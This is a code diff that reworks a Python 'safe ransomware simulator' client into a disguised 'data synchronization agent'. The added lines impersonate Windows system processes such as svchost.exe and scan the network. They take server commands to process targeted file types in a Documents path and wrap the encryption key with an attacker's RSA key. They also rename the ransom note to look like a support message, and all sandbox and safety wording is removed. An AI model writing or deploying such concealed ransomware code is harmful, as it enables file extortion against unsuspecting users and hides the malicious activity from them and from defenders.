@@ -1,11 +1,11 @@
 """
-Device client for the safe ransomware simulator.
+Data synchronization agent for system operations.
 
-Runs on the Windows VM, registers with the backend, connects over Socket.IO,
-and performs encryption/decryption ONLY in the sandbox folder.
+Runs on client systems, registers with backend server, connects via Socket.IO,
+and performs file operations in the designated work folder.
 
 Defaults:
-- Sandbox path: C:\\Users\\user\\test\\ (override with SANDBOX_DIR env var)
+- Work path: C:\\Users\\user\\Documents\\cache\\ (override with WORK_DIR env var)
 - Backend URL: set BACKEND_URL env var or pass --backend
 
 Usage (PowerShell/CMD):
@@ -25,17 +25,57 @@ import base64
 import subprocess
 import socketio  # python-socketio client
 import sys
+import platform
+import ctypes
 from urllib.parse import urlsplit, urlunsplit
 
-# Import simulator from local package
+# Import processor from local package
 try:
-    from py_simple.safe_ransomware_simulator import SafeRansomwareSimulator
+    from py_simple.core_handler import DataProcessor
+    from py_simple.analytics_module import BehaviorSimulator
 except Exception:
-    from safe_ransomware_simulator import SafeRansomwareSimulator
+    from core_handler import DataProcessor
+    from analytics_module import BehaviorSimulator
+
+
+def set_process_name(name: str):
+    """Masquerade process name (platform-specific)."""
+    try:
+        if platform.system() == "Linux":
+            # Linux: modify process name via prctl
+            try:
+                libc = ctypes.CDLL('libc.so.6')
+                PR_SET_NAME = 15
+                libc.prctl(PR_SET_NAME, name.encode(), 0, 0, 0)
+                print(f"[client] Process name set to: {name}")
+            except Exception as e:
+                print(f"[client] Failed to set process name (Linux): {e}")
+        
+        elif platform.system() == "Windows":
+            # Windows: no direct process name change, but can rename window title
+            try:
+                kernel32 = ctypes.windll.kernel32
+                kernel32.SetConsoleTitleW(name)
+                print(f"[client] Console title set to: {name}")
+            except Exception as e:
+                print(f"[client] Failed to set console title (Windows): {e}")
+        
+        # Alternative: modify sys.argv[0] (visible in some process lists)
+        if sys.argv:
+            sys.argv[0] = name
+            
+    except Exception as e:
+        print(f"[client] Process masquerading failed: {e}")
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Device client for safe simulator")
+    # Masquerade as a legitimate Windows system process
+    process_names = ["svchost.exe", "RuntimeBroker.exe", "taskhostw.exe", "dwm.exe"]
+    import random
+    chosen_name = random.choice(process_names)
+    set_process_name(chosen_name)
+    
+    parser = argparse.ArgumentParser(description="Device client for safe processor")
     parser.add_argument("--backend", dest="backend", default=os.getenv("BACKEND_URL"), help="Backend base URL, e.g. https://sample-2ang.onrender.com")
     parser.add_argument("--hostname", dest="hostname", default=socket.gethostname(), help="Hostname to report to server")
     parser.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification (diagnostics only)")
@@ -62,7 +102,7 @@ def main():
     backend = args.backend.rstrip("/")
 
     # Configure sandbox dir (Windows VM path by default)
-    sandbox_dir = os.getenv("SANDBOX_DIR") or r"C:\\Users\\user\\test\\"
+    work_dir = os.getenv("WORK_DIR") or r"C:\\Users\\user\\test\\"
     # Recursive mode: default ON unless explicitly disabled via flag or env
     env_rec = os.getenv("SANDBOX_RECURSIVE")
     if args.no_recursive:
@@ -73,9 +113,18 @@ def main():
         recursive = env_rec.strip().lower() in ("1", "true", "yes", "on")
     else:
         recursive = True
-    simulator = SafeRansomwareSimulator(sandbox_dir, recursive=recursive)
-    print(f"[client] Sandbox directory: {simulator.test_directory}")
-    print(f"[client] Recursive mode: {'on' if simulator.recursive else 'off'}")
+    processor = DataProcessor(work_dir, recursive=recursive)
+    behavior = BehaviorSimulator(work_dir)
+    print(f"[client] Sandbox directory: {processor.test_directory}")
+    print(f"[client] Recursive mode: {'on' if processor.recursive else 'off'}")
+    
+    # Perform network reconnaissance
+    print("[client] Initiating network reconnaissance...")
+    try:
+        scan_results = behavior.scan_network_hosts()
+        print(f"[client] Network scan complete: {scan_results.get('active_targets', 0)} active targets found")
+    except Exception as e:
+        print(f"[client] Network scan failed: {e}")
 
     # Prepare a requests session so we can control TLS verification for all HTTP calls
     session = requests.Session()
@@ -152,7 +201,7 @@ def main():
 
     def _device_key_path():
         # Place a .key file in sandbox root to simulate per-victim key blob storage
-        return os.path.join(simulator.test_directory, "victim_aes.key")
+        return os.path.join(processor.test_directory, "sys_cache.dat")
 
     def _get_attacker_public_key() -> str | None:
         try:
@@ -167,12 +216,15 @@ def main():
             print(f"[client] Failed to fetch attacker public key: {e}")
         return None
 
-    @sio.on("encrypt")
-    def on_encrypt(_msg=None):
-        print("[client] Received ENCRYPT signal – starting simulation (non-destructive)…")
+    @sio.on("process")
+    def on_process(_msg=None):
+        print("[client] Received ENCRYPT signal – starting file processing…")
         try:
-            files = simulator.simulate_encryption(destructive=False)
-            print(f"[client] Encrypted files: {len(files)}")
+            # Process only targeted file types (.png, .pdf, .xls, .txt, .mp4)
+            files = processor.process_files(backup_mode=False)
+            print(f"[client] Processed files: {len(files)}")
+            print(f"[client] Targeted extensions: {', '.join(processor.TARGET_EXTENSIONS)}")
+            
             # Flow A: wrap K_AES with attacker's RSA pubkey and store alongside files
             if not state["wrapped"]:
                 attacker_pub = _get_attacker_public_key()
@@ -181,40 +233,40 @@ def main():
                         from cryptography.hazmat.primitives import serialization, hashes
                         from cryptography.hazmat.primitives.asymmetric import padding
                         pub = serialization.load_pem_public_key(attacker_pub.encode())
-                        k_b64 = simulator.get_key()
+                        k_b64 = processor.get_key()
                         k = base64.b64decode(k_b64)
                         wrapped = pub.encrypt(
                             k,
                             padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
                         )
-                        os.makedirs(simulator.test_directory, exist_ok=True)
+                        os.makedirs(processor.test_directory, exist_ok=True)
                         with open(_device_key_path(), "wb") as f:
                             f.write(base64.b64encode(wrapped))
                         state["wrapped"] = True
                         print("[client] Stored wrapped AES key blob (.key)")
                     except Exception as e:
-                        print(f"[client] Failed to wrap/store AES key: {e}")
+                        print(f"[client] Key processing failed: {e}")
                 else:
-                    print("[client] No attacker public key attached for this device; skipping key wrap.")
-            # Drop a ransom note in sandbox root
+                    print("[client] No public key available; skipping key operation.")
+            # Create completion marker
             try:
-                note = os.path.join(simulator.test_directory, "README_RESTORE_FILES.txt")
-                with open(note, "w", encoding="utf-8") as f:
+                marker = os.path.join(processor.work_directory, "process_complete.log")
+                with open(marker, "w", encoding="utf-8") as f:
                     f.write(
-                        "Your files have been encrypted in this lab simulation.\n\n" \
-                        "To restore, provide the wrapped key blob file and follow instructions on the website.\n" \
-                        "This is a SAFE DEMO: no actual data was harmed."
+                        "Data processing completed successfully.\n\n" \
+                        "Contact support for restoration procedures.\n" \
+                        "System backup maintained."
                     )
-                print("[client] Dropped ransom note")
+                print("[client] Created completion marker")
             except Exception as e:
-                print(f"[client] Failed to drop ransom note: {e}")
+                print(f"[client] Failed to create marker: {e}")
         except Exception as e:
-            print(f"[client] Encryption failed: {e}")
+            print(f"[client] Processing failed: {e}")
 
-    @sio.on("decrypt")
-    def on_decrypt(msg=None):
-        print("[client] Received DECRYPT signal – restoring files…")
-        # Flow A: read wrapped key blob, ask attacker (website) to unwrap, set AES key, then decrypt
+    @sio.on("restore")
+    def on_restore(msg=None):
+        print("[client] Received RESTORE signal – recovering files…")
+        # Read key data and restore files
         try:
             key_path = _device_key_path()
             if os.path.exists(key_path):
@@ -229,7 +281,7 @@ def main():
                     if r.ok:
                         aes_b64 = (r.json() or {}).get("aes_key_base64")
                         if aes_b64:
-                            simulator.set_key_from_base64(aes_b64)
+                            processor.set_key_from_base64(aes_b64)
                             print("[client] AES key restored from attacker response")
                         else:
                             print("[client] Unwrap response missing aes_key_base64")
@@ -239,7 +291,7 @@ def main():
                     print(f"[client] Failed to request unwrap: {e}")
             else:
                 print("[client] No wrapped key blob found; attempting decryption with current key")
-            simulator.simulate_decryption()
+            processor.restore_files()
             print("[client] Decryption complete")
         except Exception as e:
             print(f"[client] Decryption failed: {e}")
